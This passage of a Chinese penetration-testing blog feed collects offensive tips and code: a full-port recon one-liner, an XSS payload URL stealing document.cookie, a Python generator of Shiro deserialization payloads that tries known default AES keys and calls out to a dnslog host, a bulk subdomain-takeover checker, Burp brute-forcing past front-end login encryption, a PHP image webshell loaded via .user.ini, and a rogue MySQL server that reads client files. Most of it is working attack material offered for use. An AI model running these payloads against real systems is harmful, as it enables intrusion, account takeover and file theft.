https://github.com/haccer/subjack</span><br><span class="line"># - https://linux.die.net/man/1/dig</span><br><span class="line"># - https://nmap.org/download.html</span><br><span class="line"># - https://github.com/rverton/webanalyze</span><br><span class="line"># - https://github.com/maurosoria/dirsearch</span><br><span class="line"># - https://github.com/GerbenJavado/LinkFinder</span><br><span class="line"># - https://github.com/EdOverflow/hacks-1/tree/master/cors-blimey</span><br><span class="line"># - https://github.com/sensepost/gowitness</span><br><span class="line"># - https://github.com/s0md3v/Arjun</span><br><span class="line"># - https://github.com/tomnomnom/meg</span><br><span class="line"># - https://github.com/tomnomnom/gf</span><br><span class="line">#</span><br><span class="line"># NOTE: Make sure $GOPATH is exported in $PATH</span><br><span class="line">#and aliasing every tool that&apos;s executed w/o binary</span><br><span class="line">#and/ binary directories that don&apos;t exist in $PATH.</span><br><span class="line">#</span><br><span class="line">#####</span><br><span class="line"></span><br><span class="line">[[ -z $1 ]] &amp;&amp; echo -e &quot;No target.\nUsage: bash $0 target.com&quot; &amp;&amp; exit || mkdir $1 &amp;&amp; cd $1 &amp;&amp; echo &quot;$1&quot; | cut -d&apos;.&apos; -f1 | metabigor net --org -o metabigor.out &amp;&amp; findomain -q -t $1 -u subdomain.out &amp;&amp; amass enum -norecursive -noalts -d $1 &gt;&gt; subdomain.out &amp;&amp; uniq subdomain.out | filter-resolved &gt; subdomain-resolved.out &amp;&amp; subjack -w subdomain-resolved.out -t 100 -timeout 30 -ssl -a -v -o subjack.out &amp;&amp; cat subdomain-resolved.out | xargs dig +short &gt; ips.txt &amp;&amp; uniq ips.txt | xargs nmap -v --reason -sV -T4 -oG nmap.out --append-output --version-light -p- &amp;&amp; egrep -v &quot;^#|Status: Up&quot; nmap.out | cut -d&apos; &apos; -f2,4- | sed -n -e &apos;s/Ignored.*//p&apos; | awk &apos;&#123;print &quot;Host: &quot; $1 &quot; Ports: &quot; NF-1; $1=&quot;&quot;; for(i=2; i&lt;=NF; i++) &#123; a=a&quot; &quot;$i; &#125;; split(a,s,&quot;,&quot;); for(e in s) &#123; split(s[e],v,&quot;/&quot;); printf &quot;%-8s %s/%-7s %s\n&quot; , v[2], v[3], v[1], v[5]&#125;; a=&quot;&quot; &#125;&apos; &gt; nmap-open.txt &amp;&amp; cat subdomain-resolved.out | httprobe | tee hosts.out &amp;&amp; webanalyze -update &amp;&amp; webanalyze -hosts hosts.out &gt; webanalyze.out &amp;&amp; dirsearch -L hosts.out -e php,json -x 400,403,429,502,503 -t 200 -F --simple-report dirsearch.out -r &amp;&amp; cat hosts.out | xargs -I % linkfinder -d -o cli -i % &gt; linkfinder.out &amp;&amp; cat dirsearch.out | cors-blimey &gt; cors.out &amp;&amp; gowitness file dirsearch.out --threads 30 &amp;&amp; arjun --urls dirsearch.out -t 100 --get &gt; arjun.out &amp;&amp; meg -d 1000 -v / hosts.out &amp;&amp; gf -list | xargs -I % gf %</span><br></pre></td></tr></table></figure><h3 id="好用的xss触发属性"><a href="#好用的xss触发属性" class="headerlink" title="好用的xss触发属性"></a>好用的xss触发属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">accesskey,onfocus,onsearch</span><br></pre></td></tr></table></figure><h3 id="在线子域名接管和跳转绕过编码"><a href="#在线子域名接管和跳转绕过编码" class="headerlink" title="在线子域名接管和跳转绕过编码"></a>在线子域名接管和跳转绕过编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackking.net/pentest-tools/</span><br></pre></td></tr></table></figure><h3 id="给xss标签放大方便onmouseover属性"><a href="#给xss标签放大方便onmouseover属性" class="headerlink" title="给xss标签放大方便onmouseover属性"></a>给xss标签放大方便onmouseover属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://cloud.google.com/products/machine-learning/partners/?tab=1%20onmouseover=alert(document.cookie)%20style=border-color:red%3bborder-style:solid%3bborder-width:10px%3bposition:fixed%3btop:0%3bleft:0%3bwidth:100%%3bheight:100%%3bz-index:100000%20a=</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;crt搜索技巧&quot;&gt;&lt;a href=&quot;#crt搜索技巧&quot; class=&quot;headerlink&quot; title=&quot;crt搜索技巧&quot;&gt;&lt;/a&gt;crt搜索技巧&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://crt.sh/?q=%25.%25.%25.%25.%25.8x8.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;%.%.%.wanmei.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;dirsearch使用技巧&quot;&gt;&lt;a href=&quot;#dirsearch使用技巧&quot; class=&quot;headerlink&quot; title=&quot;dirsearch使用技巧&quot;&gt;&lt;/a&gt;dirsearch使用技巧&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dirsearch -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sql -u &amp;lt;target&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>shiro反序列话批量探测</title>
    <link href="http://www.7wawa.com/2020/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%89%B9%E9%87%8F%E6%8E%A2%E6%B5%8B/"/>
    <id>http://www.7wawa.com/2020/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E8%AF%9D%E6%89%B9%E9%87%8F%E6%8E%A2%E6%B5%8B/</id>
    <published>2020-01-15T06:21:11.000Z</published>
    <updated>2020-01-15T06:30:41.203Z</updated>
    
    <content type="html"><![CDATA[<h3 id="shiro反序列"><a href="#shiro反序列" class="headerlink" title="shiro反序列"></a>shiro反序列</h3><p>自己用python2写了一个批量生成的  直接载入BURP就行了 </p><p>本机要有java 也要配合yso</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: cike</span></span><br><span class="line"><span class="string">@time: 2019/8/9 20:22</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>  base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dnslog = <span class="string">"xxxx.ceye.io"</span> <span class="comment">#自己写自己的dnslog地址</span></span><br><span class="line"></span><br><span class="line">keylist = &#123;<span class="string">'key1'</span>:<span class="string">'kPH+bIxk5D2deZiIxcaaaA=='</span>,</span><br><span class="line">            <span class="string">'key2'</span>:<span class="string">'KU471rVNQ6k7PQL4SqxgJg=='</span>,</span><br><span class="line">            <span class="string">'key3'</span>:<span class="string">'4AvVhmFLUs0KTA3Kprsdag=='</span>,</span><br><span class="line">            <span class="string">'key4'</span>:<span class="string">'3AvVhmFLUs0KTA3Kprsdag=='</span>,</span><br><span class="line">            <span class="string">'key5'</span>:<span class="string">'Z3VucwAAAAAAAAAAAAAAAA=='</span>,</span><br><span class="line">            <span class="string">'key6'</span>:<span class="string">'2AvVhdsgUs0FSA3SDFAdag=='</span>,</span><br><span class="line">            <span class="string">'key7'</span>:<span class="string">'wGiHplamyXlVB11UXWol8g=='</span>,</span><br><span class="line">            <span class="string">'key8'</span>:<span class="string">'fCq+/xW488hMTCD+cmJ3aQ=='</span>,</span><br><span class="line">            <span class="string">'key9'</span>:<span class="string">'1QWLxg+NYmxraMoxAXu/Iw=='</span>,</span><br><span class="line">            <span class="string">'key10'</span>:<span class="string">'ZUdsaGJuSmxibVI2ZHc9PQ=='</span>,</span><br><span class="line">            <span class="string">'key11'</span>:<span class="string">'L7RioUULEFhRyxM7a2R/Yg=='</span>,</span><br><span class="line">            <span class="string">'key12'</span>:<span class="string">'6ZmI6I2j5Y+R5aSn5ZOlAA=='</span>,</span><br><span class="line">            <span class="string">'key13'</span>:<span class="string">'r0e3c16IdVkouZgk1TKVMg=='</span>,</span><br><span class="line">            <span class="string">'key15'</span>:<span class="string">'5aaC5qKm5oqA5pyvAAAAAA=='</span>,</span><br><span class="line">            <span class="string">'key16'</span>:<span class="string">'bWluZS1hc3NldC1rZXk6QQ=='</span>,</span><br><span class="line">            <span class="string">'key17'</span>:<span class="string">'a2VlcE9uR29pbmdBbmRGaQ=='</span>,</span><br><span class="line">            <span class="string">'key18'</span>:<span class="string">'WcfHGU25gNnTxTlmJMeSpw=='</span>,</span><br><span class="line">            <span class="string">'key19'</span>:<span class="string">'3AvVhmFLUs0KTA3Kprsdag=='</span>,</span><br><span class="line">           &#125; <span class="comment">#如果有新key可以在这里编辑</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command,codekey)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>,  <span class="string">'ysoserial-master.jar'</span>, <span class="string">'URLDNS'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) *  chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = codekey</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv  =  uuid.uuid4().bytes</span><br><span class="line">    encryptor =  AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv +  encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">'__main__'</span>:</span><br><span class="line">    f = open(<span class="string">'shiro_ok.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">    <span class="keyword">for</span> key,value1 <span class="keyword">in</span> keylist.items():</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment">#print(key,value1)</span></span><br><span class="line">        url = key+<span class="string">"."</span>+dnslog</span><br><span class="line">        cmd = <span class="string">"http://%s"</span> %(url)</span><br><span class="line">        <span class="comment">#print cmd</span></span><br><span class="line">        payload =  encode_rememberme(command=cmd,codekey=value1)</span><br><span class="line">        content = payload.decode()</span><br><span class="line">        <span class="keyword">print</span> content</span><br><span class="line">        f.write(content+<span class="string">"\n"</span>)</span><br><span class="line">    <span class="comment"># print("rememberMe=&#123;&#125;".format(payload.decode()))</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>然后生成的载入BURP就好了</p><p>切记在intruder模块当中一定不要勾选URL编码特殊字符。</p><p><img src="https://i.loli.net/2020/01/15/F5Upv8W1ldCAYER.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;shiro反序列&quot;&gt;&lt;a href=&quot;#shiro反序列&quot; class=&quot;headerlink&quot; title=&quot;shiro反序列&quot;&gt;&lt;/a&gt;shiro反序列&lt;/h3&gt;&lt;p&gt;自己用python2写了一个批量生成的  直接载入BURP就行了 &lt;/p&gt;
&lt;p&gt;本机要有java 也要配合yso&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>子域接管</title>
    <link href="http://www.7wawa.com/2020/01/09/%E5%AD%90%E5%9F%9F%E6%8E%A5%E7%AE%A1/"/>
    <id>http://www.7wawa.com/2020/01/09/%E5%AD%90%E5%9F%9F%E6%8E%A5%E7%AE%A1/</id>
    <published>2020-01-09T07:24:02.000Z</published>
    <updated>2020-01-09T07:31:51.885Z</updated>
    
    <content type="html"><![CDATA[<h1 id="子域接管漏洞"><a href="#子域接管漏洞" class="headerlink" title="子域接管漏洞"></a>子域接管漏洞</h1><p>​    所谓得子域接管就是我们去接管域名得解析，很多都存在域名cname解析上，比如cname到github得域名</p><p>项目引用<a href="https://github.com/Echocipher" target="_blank" rel="noopener">Echocipher</a>/<strong><a href="https://github.com/Echocipher/Subdomain-Takeover" target="_blank" rel="noopener">Subdomain-Takeover</a></strong></p><p>他这个是单子域名检测，自己写了一个批量得来配合这个脚本</p><a id="more"></a><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">@author: cike</span></span><br><span class="line"><span class="string">@time: 2020/1/6 18:05</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subdomain_takeover <span class="keyword">import</span> cname_get,providers_read,takeover_check</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> cprint</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'domain.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> domain <span class="keyword">in</span> f:</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            url = domain.strip()</span><br><span class="line">            cname = cname_get(url)</span><br><span class="line">            <span class="keyword">if</span> cname != <span class="keyword">None</span>:</span><br><span class="line">                print(<span class="string">'[*]CNAME获取成功，正在验证是否存在于敏感列表中...'</span>, cname)</span><br><span class="line">                json_dicts = providers_read()  <span class="comment"># 接收指纹信息</span></span><br><span class="line">                <span class="keyword">for</span> json_dict <span class="keyword">in</span> json_dicts:</span><br><span class="line">                    fingerprint_lists = json_dict[<span class="string">'response'</span>]  <span class="comment"># 存储指纹信息</span></span><br><span class="line">                    fingercname_lists = json_dict[<span class="string">'cname'</span>]  <span class="comment"># 存储cname信息</span></span><br><span class="line">                    <span class="keyword">for</span> fingercname <span class="keyword">in</span> fingercname_lists:</span><br><span class="line">                        <span class="comment"># 查看cname解析值是否在指纹列表中</span></span><br><span class="line">                        <span class="keyword">if</span> fingercname <span class="keyword">in</span> cname:</span><br><span class="line">                            print(<span class="string">'[*]存在于指纹列表中，正在检测子域接管风险...'</span>)</span><br><span class="line">                            cprint((url,cname), <span class="string">'red'</span>)</span><br><span class="line">                            takeover_check(url, cname, fingerprint_lists)  <span class="comment"># 检查是否有风险以及是否已经被接管</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[*]'</span> + url + <span class="string">'不存在被接管风险'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>项目目录：</p><p><img src="C:\Users\37606\AppData\Roaming\Typora\typora-user-images\image-20200109152850907.png" alt="image-20200109152850907"></p><p>这里还可以自己手动配合一个在线查找子域接管漏洞扫描得网站：</p><p><a href="https://hackking.net/subdomain-takeover-scanner/" target="_blank" rel="noopener">https://hackking.net/subdomain-takeover-scanner/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;子域接管漏洞&quot;&gt;&lt;a href=&quot;#子域接管漏洞&quot; class=&quot;headerlink&quot; title=&quot;子域接管漏洞&quot;&gt;&lt;/a&gt;子域接管漏洞&lt;/h1&gt;&lt;p&gt;​    所谓得子域接管就是我们去接管域名得解析，很多都存在域名cname解析上，比如cname到github得域名&lt;/p&gt;
&lt;p&gt;项目引用&lt;a href=&quot;https://github.com/Echocipher&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Echocipher&lt;/a&gt;/&lt;strong&gt;&lt;a href=&quot;https://github.com/Echocipher/Subdomain-Takeover&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Subdomain-Takeover&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;他这个是单子域名检测，自己写了一个批量得来配合这个脚本&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>BURP破解前端加密Intruder</title>
    <link href="http://www.7wawa.com/2020/01/09/BURP%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86Intruder/"/>
    <id>http://www.7wawa.com/2020/01/09/BURP%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86Intruder/</id>
    <published>2020-01-09T03:10:30.000Z</published>
    <updated>2020-01-09T07:33:12.992Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BURP破解前端加密Intruder"><a href="#BURP破解前端加密Intruder" class="headerlink" title="BURP破解前端加密Intruder"></a>BURP破解前端加密Intruder</h1><p>来自c0ny1得插件</p><p>参考说明：<a href="http://gv7.me/articles/2017/jsEncrypter/" target="_blank" rel="noopener">http://gv7.me/articles/2017/jsEncrypter/</a></p><ol><li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"image"</span> id=<span class="string">"btnsubmit"</span> value=<span class="string">"提交"</span> src=<span class="string">""</span> style=<span class="string">"width:65px;height:51px"</span> tabindex=<span class="string">"3"</span> onclick=<span class="string">"checkLogin()"</span>&gt;</span><br></pre></td></tr></table></figure></li></ol><p>首先根据前端登陆可以看见是调用了checkLogin函数</p><ol><li><img src="https://i.loli.net/2020/01/09/aF9OCSGb6isRTno.png" alt=""></li></ol><a id="more"></a><p>然后checkLogin又调用了buildCode函数 </p><p><img src="https://i.loli.net/2020/01/09/L6hu2lRePVCGmgB.png" alt=""></p><p>然后我们可以看见在登陆之前，JS会把账户密码拼接成这样得字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str = &quot;12345|admin|123456|8888&quot;</span><br></pre></td></tr></table></figure><p>后面得8888是固定得 签名得12345是随机参数rnd得值 </p><p>对于上面得字符串我们可以自己写一个脚本来生成</p><p><img src="https://i.loli.net/2020/01/09/YWCIJKUfe21T7cq.png" alt=""></p><p>比如这样我们就把字符串生成好了</p><p>然后我们来修改插件需要得JS脚本</p><p>一共3个文件放在一起 <img src="https://i.loli.net/2020/01/09/LV1lqwFhareicsB.png" alt=""></p><p>其中jsEncrypter_base64.js是我们phantomjs要运行得js\</p><p>因为我们已经用python生成好了字符串所以把login.js下面这个函数改成这样</p><p><img src="https://i.loli.net/2020/01/09/lQeoITLUmAf6Jck.png" alt=""></p><p>然后要调用得主函数改成这样</p><p><img src="https://i.loli.net/2020/01/09/sbQP14BGq9pyISR.png" alt=""></p><p>然后直接运行</p><p><img src="https://i.loli.net/2020/01/09/RMiAnsa8mEHjY64.png" alt=""></p><p>然后直接测试下 OK </p><p><img src="https://i.loli.net/2020/01/09/UHNT4LV8EtKkDvm.png" alt=""></p><p>然后就直接在爆破就行了 </p><p><img src="https://i.loli.net/2020/01/09/prP2SEUqDxjmIuA.png" alt=""></p><p>这样就行了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;BURP破解前端加密Intruder&quot;&gt;&lt;a href=&quot;#BURP破解前端加密Intruder&quot; class=&quot;headerlink&quot; title=&quot;BURP破解前端加密Intruder&quot;&gt;&lt;/a&gt;BURP破解前端加密Intruder&lt;/h1&gt;&lt;p&gt;来自c0ny1得插件&lt;/p&gt;
&lt;p&gt;参考说明：&lt;a href=&quot;http://gv7.me/articles/2017/jsEncrypter/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://gv7.me/articles/2017/jsEncrypter/&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;input type=&lt;span class=&quot;string&quot;&gt;&quot;image&quot;&lt;/span&gt; id=&lt;span class=&quot;string&quot;&gt;&quot;btnsubmit&quot;&lt;/span&gt; value=&lt;span class=&quot;string&quot;&gt;&quot;提交&quot;&lt;/span&gt; src=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; style=&lt;span class=&quot;string&quot;&gt;&quot;width:65px;height:51px&quot;&lt;/span&gt; tabindex=&lt;span class=&quot;string&quot;&gt;&quot;3&quot;&lt;/span&gt; onclick=&lt;span class=&quot;string&quot;&gt;&quot;checkLogin()&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先根据前端登陆可以看见是调用了checkLogin函数&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;img src=&quot;https://i.loli.net/2020/01/09/aF9OCSGb6isRTno.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP图片另类SHELL+MySQL客户端读文件</title>
    <link href="http://www.7wawa.com/2019/10/24/PHP%E5%9B%BE%E7%89%87%E5%8F%A6%E7%B1%BBSHELL-MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
    <id>http://www.7wawa.com/2019/10/24/PHP%E5%9B%BE%E7%89%87%E5%8F%A6%E7%B1%BBSHELL-MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%BB%E6%96%87%E4%BB%B6/</id>
    <published>2019-10-24T07:50:30.000Z</published>
    <updated>2020-01-15T04:02:29.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="php图片马配合user-ini"><a href="#php图片马配合user-ini" class="headerlink" title="php图片马配合user.ini"></a>php图片马配合user.ini</h2><p>index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">printf(&quot;cike&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>.user.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.jpg</span><br></pre></td></tr></table></figure><a id="more"></a><p>然后在放置一个1.jpg的图片马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[g]);?&gt;</span><br></pre></td></tr></table></figure><p>都必须在同一目录下</p><p><img src="https://i.loli.net/2020/01/15/MKADkxjCzF5oQ7O.png" alt=""></p><p>这样就可以直接访问index.php就可以访问木马了</p><p><a href="http://localhost/index.php" target="_blank" rel="noopener">http://localhost/index.php</a>  密码g</p><h2 id="mysql客户端连接读取文件"><a href="#mysql客户端连接读取文件" class="headerlink" title="mysql客户端连接读取文件"></a>mysql客户端连接读取文件</h2><p>利用 <a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p><p><a href="https://github.com/Gifts/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server</a></p><p>直接python2执行rogue_mysql_server.py</p><p>这样就会开启一个mysql数据库服务</p><p><img src="https://i.loli.net/2020/01/15/VQ4vrBAaPTyWuCL.png" alt=""></p><p>修改自己想读取的文件，这里一定要加r’’ </p><p>然后客户端来连接就可以读取到想要的文件内容了</p><p>会在当前目录生成一个mysql.log</p><p><img src="https://i.loli.net/2020/01/15/azX8TBIlLYxgCW2.png" alt=""></p><p>就会有内容了。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;php图片马配合user-ini&quot;&gt;&lt;a href=&quot;#php图片马配合user-ini&quot; class=&quot;headerlink&quot; title=&quot;php图片马配合user.ini&quot;&gt;&lt;/a&gt;php图片马配合user.ini&lt;/h2&gt;&lt;p&gt;index.php&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;printf(&amp;quot;cike&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;.user.ini&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;auto_prepend_file=1.jpg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>MySQL注入</title>
    <link href="http://www.7wawa.com/2019/10/24/mysql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/"/>
